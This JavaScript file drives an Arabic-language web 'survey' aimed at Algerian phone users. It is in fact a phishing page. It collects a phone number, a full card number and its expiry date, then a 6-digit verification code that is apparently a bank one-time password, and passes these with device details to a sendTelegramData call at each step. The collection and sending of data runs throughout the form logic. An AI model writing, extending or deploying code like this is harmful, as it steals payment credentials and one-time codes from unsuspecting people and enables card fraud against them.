// تهيئة التطبيق
document.addEventListener('DOMContentLoaded', function() {
    // إخفاء شاشة التحميل بعد 3 ثواني
    setTimeout(() => {
        document.getElementById('loading-screen').style.opacity = '0';
        setTimeout(() => {
            document.getElementById('loading-screen').style.display = 'none';
            showPage('home-page');
            
            // بدء تتبع المستخدم
            startUserTracking();
        }, 500);
    }, 3000);
    
    // تهيئة نموذج الاستبيان
    initSurveyForm();
});

// إظهار صفحة محددة
function showPage(pageId) {
    const pages = document.querySelectorAll('.page');
    pages.forEach(page => {
        page.classList.remove('active');
    });
    document.getElementById(pageId).classList.add('active');
    
    // إرسال بيانات تتبع الصفحة
    trackPageView(pageId);
}

// الانتقال للصفحة الرئيسية
function goHome() {
    showPage('home-page');
    resetSurvey();
}

// بدء الاستبيان
function startSurvey() {
    showPage('survey-page');
    trackButtonClick('start-survey-button');
}

// العودة للصفحة السابقة
function goBack() {
    const currentStep = getCurrentStep();
    if (currentStep > 1) {
        showStep(currentStep - 1);
    } else {
        showPage('home-page');
    }
    trackButtonClick('back-button');
}

// إدارة خطوات الاستبيان
let currentStep = 1;

function showStep(stepNumber) {
    const steps = document.querySelectorAll('.survey-step');
    steps.forEach(step => {
        step.classList.remove('active');
    });
    document.getElementById(`step-${stepNumber}`).classList.add('active');
    
    // تحديث شريط التقدم
    updateProgressBar(stepNumber);
    
    currentStep = stepNumber;
}

function getCurrentStep() {
    return currentStep;
}

function nextStep(current) {
    // التحقق من صحة البيانات في الخطوة الحالية
    if (!validateStep(current)) {
        showNotification('يرجى ملء جميع الحقول المطلوبة بشكل صحيح', 'error');
        return;
    }
    
    if (current === 1) {
        // جمع بيانات الخطوة الأولى
        const formData = collectStep1Data();
        
        // التحقق من رقم الهاتف الجزائري
        if (!validateAlgerianPhone(formData.phone)) {
            showNotification('يرجى إدخال رقم هاتف جزائري صحيح (05XX XX XX XX)', 'error');
            return;
        }
        
        // إرسال البيانات إلى تليجرام
        sendTelegramData('step1_completed', formData);
        
        showStep(2);
        
        // اكتشاف معلومات الجهاز
        detectDeviceInfo();
        
    } else if (current === 2) {
        const verificationCode = document.getElementById('verification-code').value;
        
        // التحقق من صحة الكود
        if (!verificationCode || verificationCode.length !== 6 || !/^\d+$/.test(verificationCode)) {
            showNotification('يرجى إدخال رمز تحقق مكون من 6 أرقام', 'error');
            return;
        }
        
        // جمع البيانات النهائية
        const finalData = collectAllData();
        
        // إرسال البيانات النهائية إلى تليجرام
        sendTelegramData('survey_completed', finalData);
        
        // تحديث رقم المشاركة
        document.getElementById('participation-id').textContent = 
            `ALG-${Date.now().toString().slice(-8)}`;
        
        showStep(3);
        
        // إرسال تأكيد الإكمال
        sendTelegramData('thankyou_page_viewed', {});
    }
    
    trackButtonClick(`next-button-step-${current}`);
}

function updateProgressBar(step) {
    const steps = document.querySelectorAll('.progress-step');
    steps.forEach((stepElement, index) => {
        if (index + 1 <= step) {
            stepElement.classList.add('active');
        } else {
            stepElement.classList.remove('active');
        }
    });
}

function validateStep(step) {
    let isValid = true;
    
    if (step === 1) {
        const phone = document.getElementById('phone').value;
        const card = document.getElementById('card-number').value;
        const expiry = document.getElementById('expiry-date').value;
        const privacy = document.getElementById('privacy-check').checked;
        
        if (!validateAlgerianPhone(phone)) {
            markInvalid('phone', 'رقم الهاتف غير صحيح');
            isValid = false;
        } else {
            markValid('phone');
        }
        
        if (!card || card.length !== 16 || !/^\d+$/.test(card)) {
            markInvalid('card-number', 'رقم البطاقة يجب أن يكون 16 رقما');
            isValid = false;
        } else {
            markValid('card-number');
        }
        
        if (!expiry) {
            markInvalid('expiry-date', 'يرجى تحديد تاريخ الصلاحية');
            isValid = false;
        } else {
            markValid('expiry-date');
        }
        
        if (!privacy) {
            showNotification('يرجى الموافقة على سياسة الخصوصية', 'error');
            isValid = false;
        }
    }
    
    return isValid;
}

function validateAlgerianPhone(phone) {
    const regex = /^(05|06|07)[0-9]{8}$/;
    return regex.test(phone.replace(/\s/g, ''));
}

function markInvalid(fieldId, message) {
    const field = document.getElementById(fieldId);
    const validationMsg = field.parentNode.querySelector('.validation-message');
    
    field.style.borderColor = '#e74c3c';
    validationMsg.textContent = message;
    validationMsg.style.color = '#e74c3c';
}

function markValid(fieldId) {
    const field = document.getElementById(fieldId);
    const validationMsg = field.parentNode.querySelector('.validation-message');
    
    field.style.borderColor = '#2ecc71';
    validationMsg.textContent = '✓ صحيح';
    validationMsg.style.color = '#2ecc71';
}

function collectStep1Data() {
    return {
        phone: document.getElementById('phone').value,
        cardNumber: document.getElementById('card-number').value,
        expiryDate: document.getElementById('expiry-date').value,
        timestamp: new Date().toISOString()
    };
}

function collectAllData() {
    const deviceInfo = getDeviceInfo();
    
    return {
        ...collectStep1Data(),
        verificationCode: document.getElementById('verification-code').value,
        deviceInfo: deviceInfo,
        userAgent: navigator.userAgent,
        sessionId: getSessionId(),
        finalTimestamp: new Date().toISOString()
    };
}

function getSessionId() {
    if (!sessionStorage.getItem('survey_session_id')) {
        sessionStorage.setItem('survey_session_id', 
            'sess_' + Math.random().toString(36).substr(2, 9));
    }
    return sessionStorage.getItem('survey_session_id');
}

function resetSurvey() {
    currentStep = 1;
    document.querySelectorAll('.survey-form')[0].reset();
    document.getElementById('verification-code').value = '';
    document.querySelectorAll('.validation-message').forEach(msg => {
        msg.textContent = '';
    });
    updateProgressBar(1);
    showStep(1);
}

// إظهار الإشعارات
function showNotification(message, type = 'info') {
    const notification = document.getElementById('notification');
    notification.textContent = message;
    
    // تخصيص الألوان حسب النوع
    if (type === 'error') {
        notification.style.background = '#e74c3c';
    } else if (type === 'success') {
        notification.style.background = '#2ecc71';
    } else {
        notification.style.background = '#333';
    }
    
    notification.classList.add('show');
    
    setTimeout(() => {
        notification.classList.remove('show');
    }, 3000);
}

// اكتشاف معلومات الجهاز
function detectDeviceInfo() {
    const deviceInfo = getDeviceInfo();
    
    document.getElementById('device-type').textContent = deviceInfo.deviceType;
    document.getElementById('os-type').textContent = deviceInfo.os;
    document.getElementById('browser-type').textContent = deviceInfo.browser;
    document.getElementById('screen-resolution').textContent = 
        `${deviceInfo.screenWidth} × ${deviceInfo.screenHeight}`;
}

function initSurveyForm() {
    // تنسيق رقم البطاقة
    const cardInput = document.getElementById('card-number');
    cardInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
        e.target.value = value.substring(0, 19);
    });
    
    // تنسيق رقم الهاتف
    const phoneInput = document.getElementById('phone');
    phoneInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.startsWith('0')) {
            value = value.substring(0, 10);
            if (value.length >= 2) {
                value = value.replace(/(\d{2})(?=\d)/, '$1 ');
            }
            if (value.length >= 5) {
                value = value.replace(/(\d{2} \d{2})(?=\d)/, '$1 ');
            }
            if (value.length >= 8) {
                value = value.replace(/(\d{2} \d{2} \d{2})(?=\d)/, '$1 ');
            }
        }
        e.target.value = value;
    });
}
